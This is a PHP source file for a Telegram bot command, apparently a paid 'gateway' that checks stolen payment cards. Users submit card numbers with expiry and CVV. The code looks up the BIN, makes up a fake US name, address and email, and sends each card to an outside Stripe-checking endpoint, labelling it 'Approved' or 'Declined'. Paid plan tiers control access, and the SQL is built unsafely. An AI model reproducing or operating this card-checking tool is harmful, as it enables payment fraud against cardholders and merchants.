<?php

require_once '/home/alvcarr230/www/project/data/data.php';
list($cmd) = explode(" ", $text);
if($cmd == "/zr" or $cmd == ".zr" or $cmd == "!zr" or $cmd == "?zr" or $cmd == "#zr" or $cmd == ":zr" or $cmd == ",zr"){ 
    
   
// A part for gatecmd clearance
    if($cmd == '/zr'){
        $gatecmd = "zr";
    }elseif($cmd == ".zr"){
        $gatecmd = "zr";
    }elseif($cmd == "!zr"){
        $gatecmd = "zr";
    }elseif($cmd == "?zr"){
        $gatecmd = "zr";
    }elseif($cmd == "#zr"){
        $gatecmd = "zr";
    }elseif($cmd == ":zr"){
        $gatecmd = "zr";
    }elseif($cmd == ",zr"){
        $gatecmd = "zr";
    }
    $listan = clean($text);
$listaq = clean($quetzal);
if(empty($listan)){
$lista = $listaq;
}elseif(empty($listaq)){
$lista = $listan;
}
/*$content = ['chat_id' => $chat_id, 'text' => "$lista", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();*/
error_reporting(0);
unlink(getcwd().'/cookie.txt');
    
//-------------[ MYSQL CALL PART] ----_-----//

    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$SQL);
    $raw = mysqli_fetch_assoc($cs);
    $planexpiry = $raw['planexpiry'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='$gatecmd'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $gatec = $raw['gatecmd'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='zr'";
        $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $status = $raw['status'];
     mysqli_close(mysqlcon());

    
    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $plan = $raw['plan'];
     mysqli_close(mysqlcon());
    

$sql = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $chats = $raw['chats'];
    $now = time();
    
    /* This part for condition of gateways and some others*/
    if($status == "OFF"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    
    
    if($gatec != $gatecmd){
        $content = ['chat_id' => $chat_id, 'text' => "$gate_not_added", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "$premium_expired", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "$group_not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{}

    $SQL = "SELECT * FROM `administrar` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{}
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Zoro 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    } else {}

$matches = $lista;
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $lista, $matches);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
$lista = "$cc|$mes|$ano|$cvv";


        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Zoro 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Zoro 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        

         
 $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $antispam2 = $RAW['antispam2'];
     $time =   str_replace('s','',$antispam2);
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < $time)
        {
            $TotalTime = $time - $TIMEAC;
            if($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>[ANTISPAM] Try again after $TotalTime's</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }

        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $starttime = microtime(true);
$mytime = 'time1';


        $timest = time();
        $SQL = "UPDATE administrar SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);

        
        $content = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[ 💳$lista ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <i>{$mytime($starttime)}s </i></b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
      $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];


//==================[BIN LOOK-UP]======================//
$url = 'https://projectslost.xyz/bin/?bin='.$bin.'';
$fim = json_decode(file_get_contents($url), true);
$level = $fim["level"];
$type = $fim["type"];
$brand = $fim["brand"];
$country = $fim["country"]["name"];
$currency = $fim["country"]["currency"];
$bank = $fim['bank']["name"];
$bankphone = $fim['bank']["phone"];
$emoji = $fim["country"]["flag"];
$pais = $fim["country"]["ISO2"];
//==================[BIN LOOK-UP-END]======================//

///$poxySocks4 = rebootproxys();

# ------------ Ramdom User ------------ #
$firstname = ucfirst(str_shuffle('anthonysudiaj'));
$lastname = ucfirst(str_shuffle('pitoshduajdb'));
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$email = 'anthoyn'.$firstname.'us82j37'.$phone.'@gmail.com';
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = $statee;
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = $statee;
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = $statee;
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = $statee;
$zip = "32003";
$city = "Orange Park";
}else{
$state = $statee;
$zip = "90201";
$city = "Bell";
};

function getDatas($string, $start,$end){
    $uno = explode($start, $string);
    $dos = explode($end,$uno[1]);
    return $dos[0];
}
 
$content2 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - ? - ? ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <i>{$mytime($starttime)}s </i></b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m2  = EditMessageText($content2);
        $m2i = $m2['result']['message_id'];

//$datos = Random();



$content3 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - 🟠 - ? ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <i>{$mytime($starttime)}s </i></b>
", 'message_id' => $m2i, 'parse_mode' => 'html'];
$m3 = EditMessageText($content3);
        $m3i = $m3['result']['message_id'];



 $content = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - 🟠 - 🟢 ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <i>{$mytime($starttime)}s </i></b>
", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];


////////////////////////////////////// RESPONSE
$fifis = "https://juaneloapp.azurewebsites.net/apisfree/st.php?lista=$lista";
$acsser = json_decode(file_get_contents($fifis), true);
$m = $acsser['m'];
$c = $acsser['code'];
$r = $acsser['errorStripe'];
//////////////////////// END RESPONSE

if($m == "Your card has insufficient funds." || $m == "Your card's security code is incorrect." || $m == "Your card's security code is invalid." || $m == "Approved"){
    
 $contentf = ['chat_id' => $chat_id, 'text' => "<b>-----------『↯𝐌𝐊𝐙↯』-----------</b>
↳ Gateway Zoro [🍃]  
-----------------------------------------
⎆𝐂𝐂» <code>$lista</code>
⎆𝐒𝐭𝐚𝐭𝐮𝐬» [ <code>Approved ✅</code> ]
⎆𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞» <code>$m </code>
-----------------------------------------
⎆𝐁𝐢𝐧» <code>$bin</code>
⎆𝐓𝐲𝐩𝐞» <code>$brand - $type - $level</code>
⎆𝐁𝐚𝐧𝐤» <code>$bank</code>
⎆𝐂𝐨𝐮𝐧𝐭𝐫𝐲» <code>$country - $pais - $emoji</code>
------------------------------------------
⎆𝙿𝚛𝚘𝚡𝚢» Live ✅
⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <code><i>{$mytime($starttime)}s </i></code>
⎆𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲» @$username <code><b>[$plan]</b></code>
", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($contentf);
      }else{
          
           $contentf = ['chat_id' => $chat_id, 'text' => "<b>-----------『↯𝐌𝐊𝐙↯』-----------</b>
↳ Gateway Zoro [🍃] 
-----------------------------------------
⎆𝐂𝐂» <code>$lista</code>
⎆𝐒𝐭𝐚𝐭𝐮𝐬» [ <code>Declined ❌</code> ]
⎆𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞» <code>$m | $c</code>
-----------------------------------------
⎆𝐁𝐢𝐧» <code>$bin</code>
⎆𝐓𝐲𝐩𝐞» <code>$brand - $type - $level</code>
⎆𝐁𝐚𝐧𝐤» <code>$bank</code>
⎆𝐂𝐨𝐮𝐧𝐭𝐫𝐲» <code>$country - $pais - $emoji</code>
------------------------------------------
⎆𝙿𝚛𝚘𝚡𝚢» Live ✅
⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <code><i>{$mytime($starttime)}s </i></code>
⎆𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲» @$username <code><b>[$plan]</b></code>
", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($contentf);
      }
    
}

/// no tocar mas este gate, esta funcionando
?>